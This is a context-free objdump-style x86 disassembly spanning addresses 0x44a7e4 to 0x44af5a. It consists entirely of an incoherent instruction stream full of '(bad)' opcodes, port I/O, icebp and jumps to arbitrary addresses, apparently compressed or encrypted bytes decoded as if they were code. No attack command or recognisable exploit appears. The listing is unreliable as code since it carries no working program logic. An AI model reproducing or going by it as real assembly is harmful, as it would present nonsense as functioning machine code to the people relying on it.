  44a7e4:	sbb    ch,BYTE PTR [edx]
  44a7e6:	out    0x20,al
  44a7e8:	sbb    BYTE PTR [edi+edi*2-0x729ee6c6],0x39
  44a7f0:	jle    0x44a835
  44a7f2:	dec    edi
  44a7f3:	inc    ecx
  44a7f4:	or     DWORD PTR ds:0x73b4c208,esi
  44a7fa:	out    dx,al
  44a7fb:	mov    ch,0xf0
  44a7fd:	push   eax
  44a7fe:	mov    esi,0x79613693
  44a803:	mov    ebx,0x6c942d67
  44a808:	pusha  
  44a809:	enter  0x2cee,0xb5
  44a80d:	or     DWORD PTR [esi+0x76],eax
  44a810:	mov    DWORD PTR [ebp+0x49],esp
  44a813:	mov    eax,ds:0x248a923a
  44a818:	sbb    DWORD PTR [ecx],esi
  44a81a:	(bad)  
  44a81b:	fsubr  DWORD PTR [edi+edx*4-0x12]
  44a81f:	(bad)  
  44a820:	xchg   BYTE PTR ds:0x35f264f2,dl
  44a826:	xchg   esi,eax
  44a827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a828:	xor    DWORD PTR [esp+eax*1+0x4a],ecx
  44a82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a82d:	idiv   BYTE PTR [edi]
  44a82f:	js     0x44a7fd
  44a831:	xor    al,bh
  44a833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a834:	retf   0xe1d0
  44a837:	fmulp  st(3),st
  44a839:	mov    al,0x8c
  44a83b:	mov    eax,ds:0x740d4081
  44a840:	std    
  44a841:	lock mov edx,0x7c2a60f8
  44a847:	jp     0x44a86e
  44a849:	mov    WORD PTR [esi-0x7e],es
  44a84c:	test   edi,edx
  44a84e:	mov    ds:0x10e3d113,al
  44a853:	and    DWORD PTR [ebp+0x6c],edx
  44a856:	mov    edi,0xed28e799
  44a85b:	push   0x31078a25
  44a860:	std    
  44a861:	ficom  DWORD PTR [esi-0x8]
  44a864:	pop    ebp
  44a865:	leave  
  44a866:	mov    dh,0xed
  44a868:	icebp  
  44a869:	pusha  
  44a86a:	iret   
  44a86b:	cmp    BYTE PTR [esi],cl
  44a86d:	(bad)  
  44a86e:	inc    eax
  44a86f:	mov    WORD PTR [edx-0x25],gs
  44a872:	out    dx,al
  44a873:	pop    ds
  44a874:	dec    ebp
  44a875:	push   edi
  44a876:	sub    al,0x7c
  44a878:	push   ds
  44a879:	mov    ah,0xe5
  44a87b:	stos   BYTE PTR es:[edi],al
  44a87c:	pop    es
  44a87d:	sbb    ch,BYTE PTR [ebx-0x38]
  44a880:	(bad)  
  44a881:	jae    0x44a881
  44a883:	xchg   ebp,eax
  44a884:	into   
  44a885:	(bad)  
  44a886:	mov    eax,ds:0xcfd85eb7
  44a88b:	jbe    0x44a888
  44a88d:	mov    ss,ebx
  44a88f:	test   eax,0x8cb85f9e
  44a894:	pop    ecx
  44a895:	cs xchg edx,eax
  44a897:	cmp    al,0x7d
  44a899:	test   BYTE PTR [edi-0x117614e8],al
  44a89f:	add    BYTE PTR [edi],dl
  44a8a1:	outs   dx,BYTE PTR ds:[esi]
  44a8a2:	fs and al,0xf
  44a8a5:	je     0x44a925
  44a8a7:	mov    eax,ds:0x77890004
  44a8ac:	fcom   DWORD PTR [eax]
  44a8ae:	add    ch,dh
  44a8b0:	pop    esi
  44a8b1:	adc    ch,bh
  44a8b3:	outs   dx,DWORD PTR ds:[esi]
  44a8b4:	ja     0x44a89e
  44a8b6:	mov    eax,0xf4612e8f
  44a8bb:	sub    ecx,DWORD PTR [eax-0x71d99feb]
  44a8c1:	pop    edi
  44a8c2:	in     eax,dx
  44a8c3:	fstp   DWORD PTR [ebp-0x444d0899]
  44a8c9:	mov    ch,0x2e
  44a8cb:	test   al,0x70
  44a8cd:	pusha  
  44a8ce:	popf   
  44a8cf:	loope  0x44a925
  44a8d1:	pop    eax
  44a8d2:	push   ss
  44a8d3:	pop    ecx
  44a8d4:	nop
  44a8d5:	data16 jmp 0x44a8b0
  44a8d8:	ins    DWORD PTR es:[edi],dx
  44a8d9:	fcmovbe st,st(1)
  44a8db:	mov    ebp,0x88e198ff
  44a8e0:	repnz pusha 
  44a8e2:	gs mov dl,0xa0
  44a8e5:	enter  0xf3cf,0xb2
  44a8e9:	out    dx,eax
  44a8ea:	out    dx,al
  44a8eb:	jecxz  0x44a937
  44a8ed:	in     al,dx
  44a8ee:	dec    edi
  44a8ef:	rcr    DWORD PTR [esp+ecx*8],0x5d
  44a8f3:	mov    eax,ds:0xd03a8e18
  44a8f8:	pop    edx
  44a8f9:	gs xor al,0xf3
  44a8fc:	pop    esi
  44a8fd:	fistp  QWORD PTR [ecx-0x50d48a15]
  44a903:	std    
  44a904:	scas   al,BYTE PTR es:[edi]
  44a905:	pop    edi
  44a906:	push   edx
  44a907:	lea    ecx,[esi]
  44a909:	xlat   BYTE PTR ds:[ebx]
  44a90a:	jnp    0x44a97a
  44a90c:	xchg   DWORD PTR [eax+0x695e972c],edi
  44a912:	(bad)  
  44a913:	je     0x44a911
  44a915:	xchg   edi,eax
  44a916:	ins    BYTE PTR es:[edi],dx
  44a917:	dec    ebp
  44a918:	mov    ebx,0x9ab40960
  44a91d:	jp     0x44a926
  44a91f:	stos   BYTE PTR es:[edi],al
  44a920:	pop    ebp
  44a921:	jmp    0x44a946
  44a923:	dec    esp
  44a924:	dec    esp
  44a925:	loope  0x44a8e8
  44a927:	dec    esi
  44a928:	jge    0x44a943
  44a92a:	or     edx,DWORD PTR ds:[edx]
  44a92d:	popa   
  44a92e:	jae    0x44a8e7
  44a930:	or     BYTE PTR ds:[ecx-0xa],ah
  44a934:	inc    edi
  44a935:	jge    0x44a925
  44a937:	imul   ebp,DWORD PTR [esi+esi*4+0x3d],0x8
  44a93c:	(bad)  
  44a93d:	cmp    ebx,DWORD PTR ss:[edi-0x64e63974]
  44a944:	mov    esi,0xd3369102
  44a949:	xchg   esi,esp
  44a94b:	sbb    DWORD PTR [esi+0x43],ebx
  44a94e:	ja     0x44a99b
  44a950:	mov    al,BYTE PTR ds:0x5fa8bdc1
  44a956:	mov    bl,0x3c
  44a958:	fadd   DWORD PTR [edi]
  44a95a:	loop   0x44a97f
  44a95c:	lahf   
  44a95d:	mov    eax,0x605eac26
  44a962:	inc    eax
  44a963:	std    
  44a964:	jne    0x44a94a
  44a966:	push   esp
  44a967:	stos   WORD PTR es:[edi],ax
  44a969:	pusha  
  44a96a:	aad    0xc3
  44a96c:	mov    eax,ds:0x3d713cc9
  44a971:	mov    ebp,esi
  44a973:	imul   edx,DWORD PTR [eax-0x34],0x13
  44a977:	mov    ebp,0xa83ea39f
  44a97c:	mov    al,ds:0xf4a2df12
  44a981:	ror    BYTE PTR [ebx-0x16a83581],0x69
  44a988:	mov    ecx,0x52a84b65
  44a98d:	shr    DWORD PTR [esi+esi*8+0x60fdb4d5],cl
  44a994:	ret    0x187d
  44a997:	mov    eax,ds:0x9d4cc033
  44a99c:	mov    edx,edi
  44a99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a99f:	push   ss
  44a9a0:	lock sub eax,0x613c64c2
  44a9a6:	iret   
  44a9a7:	test   al,0x13
  44a9a9:	push   ecx
  44a9aa:	lods   eax,DWORD PTR ds:[esi]
  44a9ab:	mov    ecx,0x3e4860aa
  44a9b0:	or     esi,eax
  44a9b2:	ds dec ebp
  44a9b4:	ins    BYTE PTR es:[edi],dx
  44a9b5:	inc    eax
  44a9b6:	out    dx,al
  44a9b7:	jg     0x44a9c8
  44a9b9:	xchg   ebx,eax
  44a9ba:	loope  0x44aa28
  44a9bc:	test   eax,0x65a13a3f
  44a9c1:	xchg   DWORD PTR [ebx],eax
  44a9c3:	std    
  44a9c4:	xchg   ecx,eax
  44a9c5:	cmp    cl,BYTE PTR [edx+0x2f35e4f]
  44a9cb:	ins    BYTE PTR es:[edi],dx
  44a9cc:	or     DWORD PTR ds:0x5262dcaf,0x15a29306
  44a9d6:	scas   al,BYTE PTR es:[edi]
  44a9d7:	addr16 int 0x36
  44a9da:	out    0x8d,al
  44a9dc:	pop    esi
  44a9dd:	pusha  
  44a9de:	mov    WORD PTR [ebx],gs
  44a9e0:	xchg   esp,eax
  44a9e1:	mov    cl,0x91
  44a9e3:	xor    al,0xe5
  44a9e5:	pusha  
  44a9e6:	push   es
  44a9e7:	push   ecx
  44a9e8:	mov    edx,ebx
  44a9ea:	ins    DWORD PTR es:[edi],dx
  44a9eb:	(bad)  
  44a9ec:	js     0x44aa1e
  44a9ee:	out    dx,al
  44a9ef:	retw   0x1b2c
  44a9f3:	inc    ebx
  44a9f4:	ret    
  44a9f5:	pop    ecx
  44a9f6:	mul    DWORD PTR [eax+0x4e77009a]
  44a9fc:	outs   dx,DWORD PTR ds:[esi]
  44a9fd:	aam    0x48
  44a9ff:	shl    BYTE PTR [esp+edx*8],cl
  44aa02:	or     eax,0x4a42b0a1
  44aa07:	test   eax,0xf557303e
  44aa0c:	arpl   WORD PTR [eax-0x34],sp
  44aa0f:	mov    dl,0x3
  44aa11:	inc    ecx
  44aa12:	ror    DWORD PTR [esi+ebp*8-0x5c],0xc3
  44aa17:	adc    BYTE PTR [ebx+0x47],ah
  44aa1a:	mov    WORD PTR [ebx+eax*4],?
  44aa1d:	sub    BYTE PTR [edx-0x19eab684],0xa0
  44aa24:	mov    eax,0xf3c95cc8
  44aa29:	mov    bh,BYTE PTR ds:0xb85a5ecd
  44aa2f:	fcomip st,st(5)
  44aa31:	dec    esi
  44aa32:	and    BYTE PTR [eax],cl
  44aa34:	and    DWORD PTR [eax+0x24],0xffffff87
  44aa38:	ins    BYTE PTR es:[edi],dx
  44aa39:	xlat   BYTE PTR ds:[ebx]
  44aa3a:	scas   al,BYTE PTR es:[edi]
  44aa3b:	cmp    al,ch
  44aa3d:	aas    
  44aa3e:	out    dx,al
  44aa3f:	adc    DWORD PTR [esi+0x14],ebp
  44aa42:	mov    ebx,0x7394b55d
  44aa47:	mov    eax,ds:0x728bad8f
  44aa4c:	daa    
  44aa4d:	sub    DWORD PTR [ecx-0x4549a171],0x9697724c
  44aa57:	jns    0x44aa71
  44aa59:	inc    ebx
  44aa5a:	enter  0x3466,0x61
  44aa5e:	icebp  
  44aa5f:	pop    ds
  44aa60:	or     esi,edi
  44aa62:	ds js  0x44aac3
  44aa65:	jle    0x44aa0d
  44aa67:	test   ebp,eax
  44aa69:	dec    ecx
  44aa6a:	(bad)  
  44aa6b:	test   DWORD PTR [ecx+eiz*2+0x7a],ebx
  44aa6f:	jne    0x44aa9b
  44aa71:	add    eax,ebp
  44aa73:	cli    
  44aa74:	add    al,0x50
  44aa76:	out    dx,al
  44aa77:	jne    0x44aadd
  44aa79:	lahf   
  44aa7a:	ins    BYTE PTR es:[edi],dx
  44aa7b:	fist   WORD PTR [eax-0x5b5f3b83]
  44aa81:	jo     0x44aa2e
  44aa83:	or     dh,BYTE PTR [edi+0x5effb8b3]
  44aa89:	jo     0x44aa71
  44aa8b:	std    
  44aa8c:	out    dx,eax
  44aa8d:	test   al,0xe
  44aa8f:	or     DWORD PTR [esi+0x74fd155f],eax
  44aa95:	or     DWORD PTR [ecx+0x2f],ebx
  44aa98:	inc    BYTE PTR [edx+eiz*8+0x41205e96]
  44aa9f:	loopne 0x44aa22
  44aaa1:	cvttps2pi mm7,QWORD PTR [edi]
  44aaa4:	out    0xa4,eax
  44aaa6:	jno    0x44aa49
  44aaa8:	add    BYTE PTR [ecx],dh
  44aaaa:	mov    al,ds:0xcaccad42
  44aaaf:	stos   BYTE PTR es:[edi],al
  44aab0:	pop    ebx
  44aab1:	jnp    0x44aa5d
  44aab3:	aam    0xd0
  44aab5:	xacquire xchg DWORD PTR [eax-0x17309a2],edx
  44aabc:	iret   
  44aabd:	pusha  
  44aabe:	fisubr WORD PTR [edx-0x3a]
  44aac1:	xor    eax,ebp
  44aac3:	hlt    
  44aac4:	popa   
  44aac5:	mov    esi,0x26a104ee
  44aaca:	adc    edx,esp
  44aacc:	mov    cl,BYTE PTR [edi+0x73]
  44aacf:	mov    eax,ds:0x45869889
  44aad4:	call   0x5e6dab7e
  44aad9:	xchg   edx,eax
  44aada:	xchg   ebp,eax
  44aadb:	or     eax,0xaf1f9ceb
  44aae0:	xor    DWORD PTR [ecx-0x65],esp
  44aae3:	fimul  DWORD PTR [esi+ebp*4]
  44aae6:	push   0xffffffb5
  44aae8:	push   edx
  44aae9:	stos   BYTE PTR es:[edi],al
  44aaea:	out    dx,al
  44aaeb:	cmp    al,0x2d
  44aaed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44aaee:	add    dl,bh
  44aaf0:	mov    DWORD PTR [esi],eax
  44aaf2:	jmp    0x44aa94
  44aaf4:	rcr    BYTE PTR [edx-0x40],cl
  44aaf7:	adc    DWORD PTR [edi+0x317f08ce],0xffffff8b
  44aafe:	adc    esp,DWORD PTR [ebp-0x515af92]
  44ab04:	enter  0x8b60,0xc3
  44ab08:	jmp    0x226c:0x5dc746a1
  44ab0f:	ins    DWORD PTR es:[edi],dx
  44ab10:	sahf   
  44ab11:	bswap  esp
  44ab13:	icebp  
  44ab14:	call   0x575a:0x28116de9
  44ab1b:	imul   esi,DWORD PTR [edx+0x2b519e4c],0x5e0f3e06
  44ab25:	inc    edx
  44ab26:	cmp    BYTE PTR [edi],ah
  44ab28:	mov    DWORD PTR [eax+0x2b02da5a],0x621a8e02
  44ab32:	xchg   esi,eax
  44ab33:	in     eax,0xaf
  44ab35:	fnstsw WORD PTR [edx-0x273704a0]
  44ab3b:	cmp    DWORD PTR [esi+0x75],ebx
  44ab3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ab3f:	in     eax,dx
  44ab40:	inc    esp
  44ab41:	sti    
  44ab42:	jle    0x44ab8d
  44ab44:	iret   
  44ab45:	pusha  
  44ab46:	sub    ebx,DWORD PTR [ebp-0x62]
  44ab49:	cs retf 
  44ab4b:	shl    bh,0x89
  44ab4e:	in     eax,dx
  44ab4f:	jecxz  0x44ab0a
  44ab51:	mov    WORD PTR [ebp-0x5a],ds
  44ab54:	outs   dx,BYTE PTR ds:[esi]
  44ab55:	data16 data16 fucomi st,st(0)
  44ab59:	pusha  
  44ab5a:	mov    ecx,0xd0252bb9
  44ab5f:	cmc    
  44ab60:	ret    
  44ab61:	xchg   esi,ebp
  44ab63:	inc    edi
  44ab64:	or     eax,0x1bc857b6
  44ab69:	dec    edi
  44ab6a:	and    BYTE PTR [ebp+ebp*4+0x3d865674],0x7b
  44ab72:	jle    0x44ab09
  44ab74:	fnstcw WORD PTR [eax+ebx*8+0x69]
  44ab78:	pop    ebp
  44ab79:	or     edx,DWORD PTR ds:0xc9aca7b9
  44ab7f:	mov    fs:0x87b0271f,al
  44ab85:	pop    esi
  44ab86:	jmp    0x44abe9
  44ab88:	xor    DWORD PTR [ebx],esi
  44ab8a:	push   esp
  44ab8b:	or     esi,DWORD PTR [esi+0x5ec4dede]
  44ab91:	out    0x5a,eax
  44ab93:	inc    edx
  44ab94:	or     dl,BYTE PTR ds:0x60a2c42e
  44ab9a:	in     eax,dx
  44ab9b:	pop    ds
  44ab9c:	inc    ecx
  44ab9d:	push   eax
  44ab9e:	jnp    0x44ab55
  44aba0:	test   eax,0xd27612c7
  44aba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aba6:	out    dx,al
  44aba7:	jo     0x44abfc
  44aba9:	out    dx,eax
  44abaa:	xchg   edx,eax
  44abab:	mov    ebx,0xf2776124
  44abb0:	int    0xe7
  44abb2:	sti    
  44abb3:	arpl   bp,ax
  44abb5:	or     al,0xd8
  44abb7:	push   ebp
  44abb8:	pop    esi
  44abb9:	pop    edi
  44abba:	xor    esp,DWORD PTR [ebp+0x223ec413]
  44abc0:	loopne 0x44ac22
  44abc2:	imul   eax,DWORD PTR ds:0xf526aa79,0x38
  44abc9:	mov    DWORD PTR [esi-0x6],ecx
  44abcc:	pop    esi
  44abcd:	shl    edx,cl
  44abcf:	sub    DWORD PTR [esi+ecx*2],0xbd303f3d
  44abd6:	mov    ds:0x55a24ea1,eax
  44abdb:	jno    0x44ab74
  44abdd:	test   eax,0x6e5e7e4b
  44abe2:	aas    
  44abe3:	imul   BYTE PTR [ebp+0x7]
  44abe6:	(bad)  
  44abe7:	jecxz  0x44abfc
  44abe9:	push   0x215e5fcc
  44abee:	imul   ebp,ebp,0x26
  44abf1:	ja     0x44abee
  44abf3:	dec    ebx
  44abf4:	pop    esi
  44abf5:	mov    BYTE PTR ds:0x42cd3759,ah
  44abfb:	loop   0x44abce
  44abfd:	pusha  
  44abfe:	pop    ss
  44abff:	(bad)
  44ac03:	call   0xa33d:0x3aee026e
  44ac0a:	add    dh,0x2d
  44ac0d:	ret    0xa0e4
  44ac10:	stos   DWORD PTR es:[edi],eax
  44ac11:	push   ebx
  44ac12:	push   ebx
  44ac13:	pop    ebx
  44ac14:	mov    al,0x91
  44ac16:	sub    al,0xee
  44ac18:	pop    esi
  44ac19:	xchg   DWORD PTR [ebx+0x5e],ebx
  44ac1c:	jbe    0x44ac9c
  44ac1e:	into   
  44ac1f:	in     al,dx
  44ac20:	(bad)  [eax+0x3]
  44ac23:	mov    esi,0x26b1792
  44ac28:	xor    eax,0x8006ee82
  44ac2d:	jecxz  0x44ac58
  44ac2f:	enter  0xd650,0xb0
  44ac33:	mov    al,ds:0x1a8e8095
  44ac38:	icebp  
  44ac39:	jnp    0x44ac4c
  44ac3b:	test   DWORD PTR [ebp+0x6d],esp
  44ac3e:	in     al,dx
  44ac3f:	jmp    DWORD PTR [ecx]
  44ac41:	loope  0x44ac96
  44ac43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ac44:	test   eax,0x66a19aee
  44ac49:	mov    dl,0x94
  44ac4b:	mov    bh,0x41
  44ac4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ac4e:	out    dx,eax
  44ac4f:	fwait
  44ac50:	push   ecx
  44ac51:	mov    ah,0xb6
  44ac53:	retf   0xde9e
  44ac56:	add    DWORD PTR [ebx],eax
  44ac58:	out    0x5d,al
  44ac5a:	or     ah,BYTE PTR [ecx-0xb4cf69c]
  44ac60:	or     DWORD PTR [edx-0x2da24664],0xffffff81
  44ac67:	fist   DWORD PTR gs:[edx*2+0x5d339218]
  44ac6f:	mov    eax,ds:0xb08b8570
  44ac74:	push   0x68
  44ac76:	inc    ecx
  44ac77:	mov    ah,0xce
  44ac79:	fdivrp st(2),st
  44ac7b:	cmp    eax,DWORD PTR [eax-0x4f]
  44ac7e:	dec    esi
  44ac7f:	mov    esi,esp
  44ac81:	sbb    ch,ah
  44ac83:	lea    ebx,[esi-0x4b]
  44ac86:	test   al,0x88
  44ac88:	push   cs
  44ac89:	push   0x535b0d9e
  44ac8e:	sub    dl,ah
  44ac90:	out    0xe9,eax
  44ac92:	push   cs
  44ac93:	icebp  
  44ac94:	dec    ch
  44ac96:	sbb    eax,0x16a64ea1
  44ac9b:	out    0x5f,al
  44ac9d:	cmp    al,BYTE PTR [ebp+ebp*4-0x2d11e082]
  44aca4:	or     bl,BYTE PTR gs:[ebx]
  44aca7:	xchg   BYTE PTR [ebx-0x4f123240],ch
  44acad:	pusha  
  44acae:	push   edi
  44acaf:	and    BYTE PTR [ebp+0x43],dl
  44acb2:	xor    eax,0xee874acd
  44acb7:	dec    esp
  44acb8:	call   0xde22ed67
  44acbd:	and    BYTE PTR [edi-0x629eb198],dh
  44acc3:	jbe    0x44acba
  44acc5:	adc    eax,0x8a1934d
  44acca:	push   eax
  44accb:	mov    WORD PTR [eax-0x7e],fs
  44acce:	cdq    
  44accf:	int    0x53
  44acd1:	out    dx,al
  44acd2:	ss loope 0x44acfb
  44acd5:	arpl   si,dx
  44acd7:	mov    al,ds:0x7d305e29
  44acdc:	popa   
  44acdd:	les    esi,FWORD PTR [ecx-0x5]
  44ace0:	addr16 rcr ebx,1
  44ace3:	in     eax,0x17
  44ace5:	sar    BYTE PTR [eax-0x3f],cl
  44ace8:	mov    esp,DWORD PTR [eax]
  44acea:	xchg   DWORD PTR [ebx+0x5a2a60e5],edx
  44acf0:	push   cs
  44acf1:	into   
  44acf2:	cmp    esi,DWORD PTR [eax+ebp*2-0x1777fe51]
  44acf9:	xsave  [esi-0x12]
  44acfd:	dec    ecx
  44acfe:	in     eax,0x61
  44ad00:	add    BYTE PTR [ecx+0x6],ah
  44ad03:	cmp    dh,BYTE PTR [esi]
  44ad05:	enter  0xe078,0x6b
  44ad09:	jmp    0x549e69fc
  44ad0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ad0f:	repnz test DWORD PTR [ecx+0x2954a11d],esi
  44ad16:	jo     0x44acf2
  44ad18:	rcr    ch,1
  44ad1a:	pop    esi
  44ad1b:	xchg   ebx,eax
  44ad1c:	ins    BYTE PTR es:[edi],dx
  44ad1d:	xor    ebp,ebp
  44ad1f:	sbb    dh,0xbc
  44ad22:	clc    
  44ad23:	jecxz  0x44ad0b
  44ad25:	mov    bl,0xd3
  44ad27:	and    BYTE PTR [ebx-0x66],0xd9
  44ad2b:	js     0x44ad8b
  44ad2d:	sbb    BYTE PTR [ebx],bl
  44ad2f:	pop    ds
  44ad30:	mov    fs,WORD PTR [ebp+0x6089359f]
  44ad36:	push   ds
  44ad37:	adc    ah,BYTE PTR [esi+0x3]
  44ad3a:	cdq    
  44ad3b:	loope  0x44ad25
  44ad3d:	jno    0x44ad26
  44ad3f:	retf   
  44ad40:	sub    DWORD PTR [edi-0x53],ecx
  44ad43:	and    BYTE PTR [esi+0x26],ch
  44ad46:	or     al,0xf
  44ad48:	loopne 0x44adac
  44ad4a:	or     ebx,DWORD PTR [edi+0x51661c5e]
  44ad50:	mov    ah,BYTE PTR [edi]
  44ad52:	sbb    esi,esi
  44ad54:	lock push ecx
  44ad56:	out    dx,al
  44ad57:	and    eax,0xdd1ed675
  44ad5c:	push   DWORD PTR [ebx+eiz*8]
  44ad5f:	mov    al,ds:0xf37cbe7
  44ad64:	lahf   
  44ad65:	add    DWORD PTR [edx],esp
  44ad67:	leave  
  44ad68:	push   eax
  44ad69:	mov    eax,ds:0xea5f0b0d
  44ad6e:	add    DWORD PTR ss:[edx-0xd564d38],esi
  44ad75:	pusha  
  44ad76:	repz xor cl,ch
  44ad79:	sbb    dh,dl
  44ad7b:	das    
  44ad7c:	or     ecx,DWORD PTR [edi]
  44ad7e:	out    dx,al
  44ad7f:	dec    esi
  44ad80:	jo     0x44ad78
  44ad82:	fbstp  TBYTE PTR [esi]
  44ad84:	push   ebx
  44ad85:	dec    ecx
  44ad86:	and    BYTE PTR [eax+0x70f0619d],bl
  44ad8c:	test   DWORD PTR [ebx-0x64944112],ecx
  44ad92:	je     0x44adb6
  44ad94:	neg    esp
  44ad96:	push   eax
  44ad97:	mov    eax,ds:0xefca155c
  44ad9c:	into   
  44ad9d:	sti    
  44ad9e:	mov    al,0x99
  44ada0:	pop    esi
  44ada1:	in     al,0xd5
  44ada3:	cmp    BYTE PTR [ebx+ebx*8+0x61549bcb],bl
  44adaa:	mov    esp,0x5753e73d
  44adaf:	jae    0x44ae23
  44adb1:	mov    bl,0xee
  44adb3:	aad    0x68
  44adb5:	and    BYTE PTR [edi],dh
  44adb7:	lods   al,BYTE PTR ds:[esi]
  44adb8:	int3   
  44adb9:	fstp   st(5)
  44adbb:	div    DWORD PTR [ebx]
  44adbd:	popa   
  44adbe:	xor    bh,BYTE PTR [ecx+0x58]
  44adc1:	mov    ebx,DWORD PTR es:[esi+0x52ee3563]
  44adc8:	and    ecx,DWORD PTR [edx-0x749d04cb]
  44adce:	daa    
  44adcf:	mov    eax,ds:0x6b815ae4
  44add4:	cmp    dl,cl
  44add6:	sbb    dh,BYTE PTR [edx-0x296753a2]
  44addc:	mov    ebp,0xe70eb51c
  44ade1:	pusha  
  44ade2:	jmp    0x44ad72
  44ade4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ade5:	pop    ebx
  44ade6:	adc    ecx,ebp
  44ade8:	cld    
  44ade9:	leave  
  44adea:	out    dx,al
  44adeb:	(bad)  
  44adec:	test   eax,0x4d9e7b31
  44adf1:	hlt    
  44adf2:	dec    ebp
  44adf3:	icebp  
  44adf4:	pop    ebx
  44adf5:	popa   
  44adf6:	les    ebx,FWORD PTR [eax+edx*1-0x7f]
  44adfa:	jge    0x44adf8
  44adfc:	push   esi
  44adfd:	inc    ebx
  44adfe:	out    dx,al
  44adff:	jnp    0x44ad86
  44ae01:	mov    ecx,0x7d80002b
  44ae06:	cmp    al,0x11
  44ae08:	xchg   BYTE PTR [eax-0x26],ah
  44ae0b:	repnz add al,0x91
  44ae0e:	pop    ebp
  44ae0f:	(bad)  
  44ae11:	jae    0x44ae01
  44ae13:	int3   
  44ae14:	mov    WORD PTR [edx-0x1b],ds
  44ae17:	jmp    0xe14d:0xa18eea86
  44ae1e:	push   edx
  44ae1f:	in     al,0x2
  44ae21:	sti    
  44ae22:	xor    BYTE PTR [ecx],bh
  44ae24:	lock in eax,dx
  44ae26:	out    dx,al
  44ae27:	jmp    0x44ae74
  44ae29:	xor    edi,DWORD PTR ds:0x7e87bf7
  44ae2f:	mov    eax,ds:0xe571c24d
  44ae34:	lods   al,BYTE PTR ds:[esi]
  44ae35:	and    eax,DWORD PTR [ebx-0x6ccfa119]
  44ae3b:	mov    edi,0x5d37889b
  44ae40:	loop   0x44aea2
  44ae42:	sbb    al,0x56
  44ae44:	add    al,0x20
  44ae46:	pop    edx
  44ae47:	test   al,0xff
  44ae49:	jne    0x44ae37
  44ae4b:	adc    eax,0x71deda07
  44ae50:	push   ecx
  44ae51:	and    DWORD PTR [edx+0x3c],edi
  44ae54:	push   esi
  44ae55:	popa   
  44ae56:	or     eax,DWORD PTR [eax]
  44ae58:	in     al,0xc1
  44ae5a:	add    ebp,DWORD PTR [edi]
  44ae5c:	call   0xad7fd1be
  44ae61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae62:	out    dx,al
  44ae63:	stc    
  44ae64:	dec    eax
  44ae65:	mov    bl,0xbf
  44ae67:	(bad)  
  44ae68:	fisub  DWORD PTR [esi+0x43d4f065]
  44ae6e:	sub    al,BYTE PTR [esi-0x1c]
  44ae71:	loopne 0x44ae5d
  44ae73:	or     al,0x53
  44ae75:	movhps xmm0,QWORD PTR [ecx+0x5e]
  44ae79:	and    ebx,edx
  44ae7b:	ret    
  44ae7c:	gs stc 
  44ae7e:	jne    0x44aebb
  44ae80:	xor    dl,BYTE PTR [edx+0x7a]
  44ae83:	mov    ss,WORD PTR [edi]
  44ae85:	adc    BYTE PTR [esi],ch
  44ae87:	add    al,0x84
  44ae89:	out    0x3c,al
  44ae8b:	jmp    0x2ecc:0x9b2ad95f
  44ae92:	mov    bl,0x28
  44ae94:	xchg   BYTE PTR [ebx-0x73],ah
  44ae97:	mov    ds:0xd51c22a9,al
  44ae9c:	add    BYTE PTR [ecx],bh
  44ae9e:	retf   
  44ae9f:	mov    al,0x16
  44aea1:	(bad)  
  44aea2:	in     eax,dx
  44aea3:	out    0x3c,al
  44aea5:	xor    BYTE PTR [edx+0x4a963b63],dl
  44aeab:	aaa    
  44aeac:	xchg   ebx,eax
  44aead:	mov    ds:0x7f2fa32a,al
  44aeb2:	mov    ebx,0xaed5834d
  44aeb7:	bound  esi,QWORD PTR ds:0x52e67e0b
  44aebd:	pop    edx
  44aebe:	bound  esp,QWORD PTR [edi-0x22]
  44aec1:	or     DWORD PTR [esi+0x57],ebp
  44aec4:	mov    eax,0xbda073ae
  44aec9:	cmp    al,0x11
  44aecb:	mov    edx,0x95e5da9e
  44aed0:	rcl    DWORD PTR [edi-0x12],cl
  44aed3:	sub    al,0xaf
  44aed5:	call   0x4d87def5
  44aeda:	imul   esp,DWORD PTR [ecx+0x262c74db],0xffffffb9
  44aee1:	int3   
  44aee2:	push   esi
  44aee3:	popa   
  44aee4:	jmp    0x37b69d45
  44aee9:	push   es
  44aeea:	shr    DWORD PTR [ebx-0x2d],cl
  44aeed:	data16 mov bl,0xb8
  44aef0:	pushf  
  44aef1:	aad    0x97
  44aef3:	mov    al,ds:0xb81d4c22
  44aef8:	push   ds
  44aef9:	test   BYTE PTR [ebp-0x77],0x3d
  44aefd:	jmp    0x10adb3f0
  44af02:	dec    ebp
  44af03:	pop    edi
  44af04:	mov    ebp,0xe5a8a32f
  44af09:	pop    edx
  44af0a:	add    DWORD PTR [ebx+edx*8-0x67],edx
  44af0e:	test   BYTE PTR gs:[edx-0x43],ch
  44af12:	xchg   esi,eax
  44af13:	rep lods al,BYTE PTR ds:[esi]
  44af15:	cmc    
  44af16:	out    dx,al
  44af17:	icebp  
  44af18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44af19:	fs and al,0x1
  44af1c:	es stos DWORD PTR es:[edi],eax
  44af1e:	add    DWORD PTR [edx-0x48f23c30],esp
  44af24:	mov    eax,0x1851671d
  44af29:	xchg   edx,esi
  44af2b:	in     eax,0x78
  44af2d:	mov    esi,0x523fdec1
  44af32:	fisub  WORD PTR [edx-0x65]
  44af35:	sub    DWORD PTR [esi-0x42],0x1c8801dc
  44af3c:	scas   al,BYTE PTR es:[edi]
  44af3d:	cli    
  44af3e:	out    dx,al
  44af3f:	xchg   esi,eax
  44af40:	fst    DWORD PTR [ebx]
  44af42:	jnp    0x44af26
  44af44:	dec    ecx
  44af45:	addr16 cdq 
  44af47:	mov    eax,ds:0x2a38ec8e
  44af4c:	mov    esp,0x7aaedc50
  44af51:	(bad)
  44af54:	jle    0x44af91
  44af56:	dec    edx
  44af57:	popa   
  44af58:	lods   al,BYTE PTR ds:[esi]
  44af59:	(bad)  
  44af5a:	(bad)  
